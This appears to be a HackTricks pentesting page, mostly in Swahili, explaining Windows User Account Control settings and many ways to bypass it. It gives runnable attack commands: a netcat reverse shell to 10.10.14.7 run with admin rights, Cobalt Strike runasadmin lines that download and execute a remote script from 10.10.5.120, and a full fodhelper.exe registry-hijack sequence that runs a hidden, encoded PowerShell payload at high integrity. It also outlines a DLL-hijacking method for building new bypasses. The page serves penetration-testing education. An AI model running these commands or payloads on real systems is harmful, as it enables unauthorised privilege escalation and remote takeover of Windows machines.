# UAC - Udhibiti wa Akaunti ya Mtumiaji

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kidokezo cha idhini kwa shughuli zinazohitaji mamlaka ya juu**. Programu zina ngazi mbalimbali za `integrity`, na programu yenye **ngazi ya juu** inaweza kufanya kazi ambazo zinaweza **kuathiri usalama wa mfumo**. Wakati UAC imewezeshwa, programu na shughuli zinaendesha kila wakati **chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi** isipokuwa msimamizi kwa wazi awaruhusu programu/shughuli hizo kupata ufikiaji wa kiwango cha msimamizi kwenye mfumo ili kuendesha. Ni kipengele cha urahisi kinachowalinda wasimamizi dhidi ya mabadiliko yasiyotarajiwa lakini haizingatiwi kama mpaka wa usalama.

Kwa habari zaidi kuhusu ngazi za integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wakati UAC iko, mtumiaji msimamizi anapewa tokeni 2: tokeni ya kawaida ya mtumiaji, kwa kutekeleza vitendo vya kawaida kwa kiwango cha kawaida, na tokeni moja yenye haki za msimamizi.

Ukurasa huu [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) unajadili jinsi UAC inavyofanya kazi kwa kina na unajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na usanifu wa UAC. Wasimamizi wanaweza kutumia sera za usalama kusanidi jinsi UAC inavyofanya kazi kulingana na shirika lao kwa ngazi ya eneo (kutumia secpol.msc), au kusanidiwa na kusambazwa kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali inajadiliwa kwa undani [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy inayoweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo ya ziada:

| Mpangilio wa Group Policy                                                                                                                                                                                                                                                                                                                                                           | Kifunguo cha Rejista                | Mipangilio ya chaguo-msingi                                  |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Imezimwa                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Imezimwa                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Omba idhini kwa binaries zisizo za Windows                   |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Ombwa taarifa za kuingia kwenye desktop salama              |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Imewezeshwa (chaguo-msingi kwa home) Imezimwa (chaguo-msingi kwa enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Imezimwa                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Imewezeshwa                                                   |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Imewezeshwa                                                   |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Imewezeshwa                                                   |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Imewezeshwa                                                   |

### UAC Bypass Theory

Baadhi ya programu zinapewa **autoelevated automatically** ikiwa **mtumiaji ni mwanachama** wa **kundi la administrator**. Binaries hizi zina ndani ya _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary pia lazima iwe **imesainiwa na Microsoft**.

Mchakato wa auto-elevate mwingi huweka **utendaji kupitia COM objects au RPC servers**, ambao yanaweza kuitwa kutoka kwa michakato inayokimbia kwa integrity ya medium (idhani ya mtumiaji wa kawaida). Kumbuka COM (Component Object Model) na RPC (Remote Procedure Call) ni mbinu ambazo programu za Windows hutumia kuwasiliana na kutekeleza kazi kati ya michakato tofauti. Kwa mfano, **`IFileOperation COM object`** imetengenezwa kushughulikia shughuli za faili (kopi, kufuta, kuhamisha) na inaweza auto-elevate vibali bila ombi.

Kumbuka kwamba baadhi ya ukaguzi unaweza kufanywa, kama kuangalia ikiwa mchakato ulitendewa kutoka kwa **System32 directory**, ambayo inaweza kupitishwa kwa mfano kwa **kufunya katika explorer.exe** au executable nyingine iliyoko System32.

Njia nyingine ya kupitishwa kwa ukaguzi huu ni **kurekebisha PEB**. Kila mchakato katika Windows una Process Environment Block (PEB), ambayo inajumuisha data muhimu kuhusu mchakato, kama njia ya executable yake. Kwa kurekebisha PEB, mashambulizi wanaweza kuiga (spoof) mahali pa mchakato wao hatari, kuonekana kama inaruka kutoka kwa saraka ya kuaminika (kama system32). Taarifa hii iliyodanganywa inamshawishi COM object auto-elevate vibali bila kumwuliza mtumiaji.

Kisha, ili **kupitisha** **UAC** (kuinua kutoka kwa integrity ya **medium** hadi **high**), baadhi ya mashambulizi hutumia aina hizi za binaries kutekeleza **code yoyote** kwa sababu italetea kutekelezwa kutoka kwa mchakato wa integrity ya High.

Unaweza **kuangalia** _**Manifest**_ ya binary kwa kutumia zana _**sigcheck.exe**_ kutoka Sysinternals. (`sigcheck.exe -m <file>`) Na unaweza **kuona** ngazi ya **integrity** ya michakato kwa kutumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).

### Check UAC

Ili kuthibitisha kama UAC imewezeshwa fanya:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Kama ni **`1`** basi UAC imewezeshwa, ikiwa ni **`0`** au haipo, basi UAC haifanyi kazi.

Kisha, angalia **ni kiwango gani** kimewekwa:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
- If **`3`** like `1` but not necessary on Secure Desktop
- If **`4`** like `2` but not necessary on Secure Desktop
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una ufikiaji wa grafiki kwa upande wa mwathiriwa, UAC bypass ni rahisi kwani unaweza kubofya "Yes" unapopokea onyo la UAC

UAC bypass inahitajika katika hali zifuatazo: **UAC imewashwa, mchakato wako unakimbia katika muktadha wa medium integrity, na mtumiaji wako ni sehemu ya administrators group**.

Ni muhimu kutaja kwamba ni **ngumu zaidi ku-bypass UAC ikiwa iko katika kiwango cha juu kabisa cha usalama (Always) kuliko ikiwa iko katika mojawapo ya viwango vingine (Default).**

### UAC imezimwa

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **execute a reverse shell with admin privileges** (high integrity level) kwa kutumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Msingi Sana** UAC "bypass" (upatikanaji kamili wa mfumo wa faili)

Ikiwa una shell na mtumiaji aliyeko ndani ya kikundi cha Administrators, unaweza **mount the C$** iliyoshirikiwa kupitia SMB (file system) kama drive mpya ndani ya eneo la mfumo na utapata **upatikanaji wa kila kitu ndani ya mfumo wa faili** (hata folda ya nyumbani ya Administrator).

> [!WARNING]
> **Inaonekana hila hii haifanyi kazi tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass na cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu kabisa cha usalama.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina moduli kadhaa za **bypass** **UAC**.

### KRBUACBypass

Nyaraka na zana ziko katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) ambayo ni **mkusanyiko** wa kadhaa UAC bypass exploits. Kumbuka kwamba utahitaji **compile UACME using Visual Studio or msbuild**. Ujenzi huo utatengeneza executables kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unayohitaji.**\ Unapaswa **kuwa mwangalifu** kwa sababu baadhi ya bypasses zitaamsha **programu nyingine** ambazo zitatuma **taarifa** kwa **mtumiaji** kwamba kuna kitu kinaendelea.

UACME ina **build version kutoka ambako kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayoathiri matoleo yako:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Pia, kwa kutumia [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page utapata toleo la Windows `1607` kutoka kwa matoleo ya build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary ya kuaminika `fodhelper.exe` huinuliwa kiotomatiki kwenye Windows za kisasa. Ikitumika, inalenga njia ya rejista ya kila mtumiaji hapa chini bila kuthibitisha verb `DelegateExecute`. Kuweka amri hapo kunaruhusu mchakato wa Medium Integrity (mtumiaji yuko kwenye Administrators) kuanzisha mchakato wa High Integrity bila onyo la UAC.

Njia ya rejista inayoulizwa na fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Hatua za PowerShell (weka payload yako, kisha trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Inafanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni default/lenient (si Always Notify na vikwazo vya ziada).
- Tumia njia ya `sysnative` kuanzisha PowerShell ya 64-bit kutoka mchakato wa 32-bit kwenye Windows 64-bit.
- Payload inaweza kuwa amri yoyote (PowerShell, cmd, au njia ya EXE). Epuka UI zinazochochea kusubiri ruhusa kwa ajili ya kimya (stealth).

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

Unaweza kupata kwa kutumia session ya **meterpreter**. Migrate kwenda kwa **process** ambayo ina thamani ya **Session** sawa na **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### UAC Bypass with GUI

Ikiwa una ufikiaji wa **GUI unaweza tu kukubali UAC prompt** unapoupata, kwa hakika huhitaji bypass. Hivyo, kupata ufikiaji wa GUI kutakuwezesha kupita UAC.

Zaidi ya hayo, ikiwa unapata session ya GUI ambayo mtu alikuwa anaitumia (inawezekana kupitia RDP) kuna **zana baadhi zitakazoendeshwa kama administrator** ambapo unaweza **kufanya** **cmd** kwa mfano **as admin** moja kwa moja bila kuonyeshwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa kidogo zaidi **stealthy**.

### Noisy brute-force UAC bypass

Ikiwa hukujali kuhusu kelele unaweza daima **kimbia kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) kinachotaka kuinua ruhusa hadi mtumiaji atakubali.

### Your own bypass - Basic UAC bypass methodology

Ikiwa utaangalia **UACME** utagundua kwamba **uwezekano mkubwa UAC bypasses hutumia udhaifu wa Dll Hijacking** (hasa kuandika dll hatari kwenye _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tafuta binary ambayo ita **autoelevate** (angalia kwamba inapoendeshwa inaendesha kwenye high integrity level).
2. Kwa kutumia procmon tafuta matukio ya "**NAME NOT FOUND**" ambayo yanaweza kuwa dhaifu kwa **DLL Hijacking**.
3. Huenda utahitaji **kuandika** DLL ndani ya baadhi ya **protected paths** (kama C:\Windows\System32) ambapo huna ruhusa ya kuandika. Unaweza kupita hili kwa kutumia:
   1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa yaliyomo ya CAB ndani ya protected paths (kwa sababu zana hii inaendeshwa kutoka high integrity level).
   2. **IFileOperation**: Windows 10.
4. Andaa **script** ili kunakili DLL yako ndani ya protected path na uendeshe binary dhaifu na autoelevated.

### Another UAC bypass technique

Inajumuisha kuangalia kama **autoElevated binary** inajaribu **kusoma** kutoka kwa **registry** jina/nafasi ya **binary** au **command** itakayotekelezwa (hii inakuwa ya kuvutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
